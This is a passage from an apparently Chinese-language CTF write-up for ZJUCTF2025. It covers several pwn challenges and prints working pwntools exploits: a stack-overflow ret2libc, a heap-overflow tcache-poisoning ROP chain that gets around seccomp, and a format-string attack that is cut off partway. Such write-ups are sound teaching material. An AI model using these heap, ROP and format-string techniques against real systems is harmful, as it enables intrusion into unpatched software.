class="number">0x172951</span>, <span class="number">0x172952</span>]</span><br><span class="line">one_gadget = libc_base + one_gadget[<span class="number">1</span>]</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">str_bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b"/bin/sh\x00"</span>))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span> * <span class="number">10</span> + p32(system) + p32(str_bin_sh) + p32(str_bin_sh) + p32(str_bin_sh)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x42</span> -<span class="number">8</span> -<span class="number">8</span>, <span class="string">b"A"</span>) + canary</span><br><span class="line"></span><br><span class="line">payload += p32(arg1 - <span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">payload += p32(arg1)</span><br><span class="line">payload += p32(arg1)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># payload += (old_ebp)</span></span><br><span class="line">payload += p32(one_gadget)</span><br><span class="line">payload += p32(one_gadget)</span><br><span class="line">payload += p32(one_gadget)</span><br><span class="line">sla(<span class="string">b"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">s(payload)</span><br><span class="line">sla(<span class="string">b"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>
<p>32位程序比较烦，他会在<code>ebp</code>上面维持一坨元数据，比如全局偏移表之类乱七八糟的，所以在打栈溢出之前我选择把这些东西一个个泄露下来保存（包括canary），之后打溢出的时候再还原回去，我的做法选择直接将程序打到one_gadget</p>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251125222423882.png"></p>
<p><code>ZJUCTF{ea$iest_re72l1bc_u_know_r0p_w3ll}</code></p>
<h3 id="sandbox-of-who_am_i">3 sandbox of who_am_i</h3>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">__uid_t</span> uid; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> n3; <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">passwd</span> *v8; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = <span class="built_in">seccomp_init</span>(<span class="number">2147418112LL</span>, argv, envp);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(v6, <span class="number">0LL</span>, <span class="number">59LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(v6, <span class="number">0LL</span>, <span class="number">322LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(v6, <span class="number">0LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">seccomp_load</span>(v6);</span><br><span class="line">  <span class="built_in">seccomp_release</span>(v6);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  n3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">"%d"</span>, &amp;n3) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid input."</span>);</span><br><span class="line">      <span class="keyword">while</span> ( <span class="built_in">getchar</span>() != <span class="number">10</span> )</span><br><span class="line">        ;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( n3 == <span class="number">3</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Goodbye!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( n3 &gt; <span class="number">3</span> )</span><br><span class="line">    {</span><br><span class="line">LABEL_16:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice."</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( n3 == <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      uid = <span class="built_in">getuid</span>();</span><br><span class="line">      v8 = <span class="built_in">getpwuid</span>(uid);</span><br><span class="line">      <span class="built_in">puts</span>(v8-&gt;pw_name);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( n3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      size = <span class="number">0</span>;</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;size);</span><br><span class="line">      <span class="keyword">if</span> ( size &gt; <span class="number">0</span> &amp;&amp; size &lt;= <span class="number">1280</span> )</span><br><span class="line">      {</span><br><span class="line">        s = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="built_in">memset</span>(s, <span class="number">0</span>, size);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, s, <span class="number">0x500</span>uLL);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Hello, %s\n"</span>, (<span class="type">const</span> <span class="type">char</span> *)s);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>main函数里面做了如下的修改，我们写入的字符串会被分配到堆上，并且whoami的方式也改成了去找uid对应的name。但是这里有一个洞，不论我们分配什么size的堆都会允许输入0x500个字节，存在堆溢出。</p>
<p>但问题是我们没有办法第二次利用这个堆，也就是我们必须有一个free状态的堆块才能用新分配的这个chunk搞事情</p>
<p>但还好，可以看到程序之前加了一坨沙箱，这一堆沙箱会为我们生成一大坨已free的位于tcache链子上的堆块</p>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251125222902335.png"></p>
<p>那我们就可以利用堆溢出搞事情了，比如分配一个0x20大小的堆块，就会把0x20链子上的第一个堆块拿出来，然后可以去通过溢出改写任何一个高地址堆块的fd，控制下一次高地址堆块所处tcachebin链子分配的地址。</p>
<p>看了下沙箱：</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@LAPTOP-<span class="number">1</span>THOKMAC:/home/wingee/ZJUCTF2025/sandbox# seccomp-tools dump ./sandbox</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000004</span>  <span class="keyword">A</span> = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15 0x00</span> <span class="number">0</span>x07 <span class="number">0</span>xc000003e  if (<span class="keyword">A</span> != ARCH_X86_64) goto <span class="number">0009</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000000</span>  <span class="keyword">A</span> = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35 0x00</span> <span class="number">0</span>x01 <span class="number">0x40000000</span>  if (<span class="keyword">A</span> &lt; <span class="number">0x40000000</span>) goto <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15 0x00</span> <span class="number">0</span>x04 <span class="number">0</span>xffffffff  if (<span class="keyword">A</span> != <span class="number">0</span>xffffffff) goto <span class="number">0009</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15 0x03</span> <span class="number">0</span>x00 <span class="number">0x00000002</span>  if (<span class="keyword">A</span> == open) goto <span class="number">0009</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15 0x02</span> <span class="number">0</span>x00 <span class="number">0</span>x0000003b  if (<span class="keyword">A</span> == execve) goto <span class="number">0009</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15 0x01</span> <span class="number">0</span>x00 <span class="number">0x00000142</span>  if (<span class="keyword">A</span> == execveat) goto <span class="number">0009</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x06 0x00</span> <span class="number">0</span>x00 <span class="number">0</span>x7fff0000  return ALLOW</span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x06 0x00</span> <span class="number">0</span>x00 <span class="number">0x00000000</span>  return KILL</span><br></pre></td></tr></table></figure>
<p>不允许open的话用openat替代就好了，这题对分配的堆块有读的功能，2.35的libc，所以不用打IO，打environ泄露栈地址rop就行</p>
<p>其他的堆块布局如下</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fastbins</span></span><br><span class="line"><span class="attribute">0x20</span>: <span class="number">0</span>x652c8d90b320 —▸ <span class="number">0</span>x652c8d90b410 —▸ <span class="number">0</span>x652c8d90b430 —▸ <span class="number">0</span>x652c8d90be30 —▸ <span class="number">0</span>x652c8d90bf40 —▸ <span class="number">0</span>x652c8d90c050 —▸ <span class="number">0</span>x652c8d90c300 —▸ <span class="number">0</span>x652c8d90c4a0 ◂— ...</span><br><span class="line"><span class="attribute">0x70</span>: <span class="number">0</span>x652c8d90be50 —▸ <span class="number">0</span>x652c8d90c530 —▸ <span class="number">0</span>x652c8d90c390 —▸ <span class="number">0</span>x652c8d90c1f0 ◂— <span class="number">0</span></span><br><span class="line"><span class="attribute">unsortedbin</span></span><br><span class="line"><span class="attribute">all</span>: <span class="number">0</span>x652c8d90b9d0 —▸ <span class="number">0</span>x77b17cc1ace0 (main_arena+<span class="number">96</span>) ◂— <span class="number">0</span>x652c8d90b9d0</span><br><span class="line"><span class="attribute">smallbins</span></span><br><span class="line"><span class="attribute">empty</span></span><br><span class="line"><span class="attribute">largebins</span></span><br><span class="line"><span class="attribute">empty</span></span><br></pre></td></tr></table></figure>
<p>本题exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">p = websocket(<span class="string">"wss://ctf.zjusec.com/api/proxy/3fd7721e-f955-41c7-80a9-24caceac4867"</span>)</span><br><span class="line"><span class="comment"># p = process("./sandbox")</span></span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whoami</span>():</span><br><span class="line">    sla(<span class="string">b"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whoareyou</span>(<span class="params">size, payload</span>):</span><br><span class="line">    sla(<span class="string">b"[1] Who am I?\n[2] Who are you?\n[3] Goodbye!\nYour choice: "</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sl(<span class="built_in">str</span>(size))</span><br><span class="line">    s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span> * <span class="number">0x1c0</span> + <span class="string">b"A"</span> * <span class="number">0x10</span></span><br><span class="line">whoami() </span><br><span class="line"></span><br><span class="line">whoareyou(<span class="number">0x1c0</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - (<span class="number">0x7092aee1ace0</span> - <span class="number">0x7092aec00000</span>)</span><br><span class="line">success(<span class="string">"libc_base =&gt; "</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"flag"</span>.ljust(<span class="number">0x340</span> - <span class="number">0x290</span>, <span class="string">b"A"</span>)</span><br><span class="line">whoareyou(<span class="number">0x50</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">success(<span class="string">"heap_base =&gt; "</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">key = heap_base &gt;&gt; <span class="number">12</span></span><br><span class="line">payload = <span class="string">b"A"</span> * (<span class="number">0xed0</span> - <span class="number">0xb10</span>) + p64((libc_base + libc.sym[<span class="string">"__environ"</span>] - <span class="number">0x70</span>) ^ key)</span><br><span class="line">whoareyou(<span class="number">0xc0</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span> * <span class="number">0x70</span></span><br><span class="line">whoareyou(<span class="number">0x70</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span> * <span class="number">0x70</span></span><br><span class="line">whoareyou(<span class="number">0x70</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">success(<span class="string">"stack_addr =&gt; "</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">pre_ret_addr = stack_addr - ( <span class="number">0x7ffd5f0ea098</span> - <span class="number">0x7ffd5f0e9f40</span>) - <span class="number">8</span> - <span class="number">8</span> - <span class="number">0xc0</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">"pre_ret_addr =&gt; "</span> + <span class="built_in">hex</span>(pre_ret_addr))</span><br><span class="line"></span><br><span class="line">paylaod = <span class="string">b"A"</span> * (<span class="number">0x7e0</span> - <span class="number">0x6b0</span>) + p64(pre_ret_addr ^ key)</span><br><span class="line">whoareyou(<span class="number">0xe0</span>, paylaod)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span></span><br><span class="line">whoareyou(<span class="number">0xc0</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span></span><br><span class="line"></span><br><span class="line">nop_ret = libc_base + <span class="number">0x05464f</span>  <span class="comment"># : nop ; xor rax, rax ; re</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span> <span class="comment"># : pop rdi ; ret</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span> </span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x00000000000904a9</span> <span class="comment"># : pop rdx ; pop rbx ; ret</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x45eb0</span> </span><br><span class="line">pop_rcx = libc_base + <span class="number">0x000000000003d1ee</span></span><br><span class="line">syscall = <span class="number">0x42759</span> + libc_base</span><br><span class="line">flag_addr = heap_base + <span class="number">0x1900</span></span><br><span class="line">payload = <span class="string">b"./flag\x00"</span></span><br><span class="line">whoareyou(<span class="number">0x50</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret + <span class="number">1</span>) * (<span class="number">0xd0</span> // <span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0xFFFFFFFFFFFFFF9C</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rax) + p64(<span class="number">257</span>) + p64(pop_rdx_rbx_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(pop_rcx) + p64(heap_base) + p64(syscall) </span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">5</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_rbx_ret) + p64(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_rbx_ret) + p64(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">1</span>) + p64(syscall)</span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">"exit"</span>])</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">whoareyou(<span class="number">0xc0</span>, payload)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>
<p>第一次whoami之后发现在高地址处出现了一个用起来特别顺手的unsorted bin，直接堆溢出到这个unsorted bin把指针拉出来泄露libc~</p>
<p>后面就是用各种size的tcachebin链子的第一堆块互相覆盖fd来控堆块分配的地址，包括分配到environ泄露栈地址，分配到栈上写rop</p>
<p>麻烦的就是远程用openat打开文件之后fd不是3是5，这个真是一个个试出来的。</p>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251125223902379.png"></p>
<p><code>ZJUCTF{L1bc2.35_IO_FILE+s3cC0Mp-eXecVe&amp;0Pen=wHO_@m_i-3}</code></p>
<h3 id="section">4 2048</h3>
<p>这个题目好像实现了一个特别复杂的游戏功能，</p>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251125224239578.png"></p>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251125224218073.png"></p>
<p>不重要，一眼丁到了格式化字符串漏洞。明确，无限次执行，payload长度最长可以到达0x64字节大小</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root<span class="keyword">@LAPTOP-</span><span class="number">1</span><span class="attribute">THOKMAC</span>:/home/wingee/ZJUCTF2025/Pwn/<span class="number">2048</span># checksec target</span><br><span class="line">[*] <span class="string">'/home/wingee/ZJUCTF2025/Pwn/2048/target'</span></span><br><span class="line">    <span class="attribute">Arch</span>:     amd64-<span class="number">64</span>-little</span><br><span class="line">    <span class="attribute">RELRO</span>:    Full RELRO</span><br><span class="line">    <span class="attribute">Stack</span>:    Canary found</span><br><span class="line">    <span class="attribute">NX</span>:       NX enabled</span><br><span class="line">    <span class="attribute">PIE</span>:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>Full Relro不能劫持GOT，所以选择篡改main函数返回地址到one_gadget</p>
<p>本题exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = websocket(<span class="string">"wss://ctf.zjusec.com/api/proxy/36592754-e144-4d99-a247-90da749f98ce"</span>)</span><br><span class="line"><span class="comment"># p = process("./target")</span></span><br><span class="line">elf = ELF(<span class="string">"./target"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc.so.6")</span></span><br><span class="line"></span><br><span class="line">offset_csu = <span class="number">0x98</span> // <span class="number">8</span> + <span class="number">1</span> + <span class="number">5</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">"%{}$p"</span>.<span class="built_in">format</span>(offset_csu).encode()</span><br><span class="line">sl(payload)</span><br><span class="line">p.recvuntil(<span class="string">b'0x'</span>)</span><br><span class="line">leak = <span class="built_in">eval</span>(<span class="string">"0x"</span> + p.recv(<span class="number">12</span>).decode())</span><br><span class="line">success(<span class="string">"leak =&gt; "</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">elf_base = leak - (<span class="number">0x5bb9b76fb9cd</span> - <span class="number">0x5bb9b76f9000</span>)</span><br><span class="line">success(<span class="string">"elf_base =&gt; "</span> + <span class="built_in">hex</span>(elf_base))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">offset_stack_ptr = <span class="number">0xc0</span> // <span class="number">8</span> + <span class="number">1</span> + <span class="number">5</span></span><br><span class="line">paylaod = <span class="string">"%{}$p"</span>.<span class="built_in">format</span>(offset_stack_ptr).encode()</span><br><span class="line">sl(paylaod)</span><br><span class="line">p.recvuntil(<span class="string">b'0x'</span>)</span><br><span class="line">stack_ptr = <span class="built_in">eval</span>(<span class="string">"0x"</span> + p.recv(<span class="number">12</span>).decode())</span><br><span class="line">ptr_2_ret = stack_ptr - (<span class="number">0x7a0</span> - <span class="number">0x6b8</span>)</span><br><span class="line">success(<span class="string">"stack_ptr =&gt; "</span> + <span class="built_in">hex</span>(stack_ptr))</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">target_addr = elf_base + <span class="number">0x2816</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">one_gadget = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line"></span><br><span class="line">offset_4 = <span class="number">0xd8</span> // <span class="number">8</span> + <span class="number">1</span> + <span class="number">5</span></span><br><span class="line">payload = <span class="string">"%{}$p"</span>.<span class="built_in">format</span>(offset_4).encode()</span><br><span class="line">sl(payload)</span><br><span class="line">p.recvuntil(<span class="string">b'0x'</span>)</span><br><span class="line">leak = <span class="built_in">eval</span>(<span class="string">"0x"</span> + p.recv(<span class="number">12</span>).decode())</span><br><span class="line">success(<span class="string">"leak =&gt; "</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">libc_base = leak - (<span class="number">0x79c77370b083</span> - <span class="number">0x79c7736e7000</span>)</span><br><span class="line">success(<span class="string">"libc_base =&gt; "</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.recv()</span><br><span class="line">one_gadget_addr = libc_base + one_gadget[<span class="number">1</span>]</span><br><span class="line">target_addr = one_gadget_addr</span><br><span class="line">offset_3 = <span class="number">0x40</span> // <span class="number">8</span> + <span class="number">1</span> + <span class="number">5</span> + <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span 